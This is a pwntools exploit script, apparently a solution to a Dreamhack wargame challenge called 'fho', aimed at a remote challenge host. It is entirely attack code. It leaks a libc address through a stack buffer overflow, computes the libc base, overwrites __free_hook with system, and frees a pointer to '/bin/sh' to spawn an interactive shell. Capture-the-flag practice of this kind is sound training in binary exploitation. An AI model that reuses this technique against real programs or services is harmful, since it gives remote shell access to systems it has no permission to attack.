from pwn import *

p = remote('host3.dreamhack.games', 14026)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr) : return success(': '.join([name, hex(addr)]))

# [1] Stack buffer overflow
buf = b'A' * 0x48
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)

libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00' * 2)

lb = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
system = lb + libc.symbols['system']
free_hook = lb + libc.symbols['__free_hook']
binsh = lb + next(libc.search(b'/bin/sh'))

# [2] Arbitrary-Address-Write -> addr=free_hook, value=system
p.sendlineafter(b'To write', str(free_hook).encode())
p.sendlineafter(b'With: ', str(system).encode())

# [3] Arbitrary-Address-Free -> free("/bin/sh")=> system("/bin/sh")
p.sendlineafter(b'To free: ', str(binsh).encode())

p.interactive()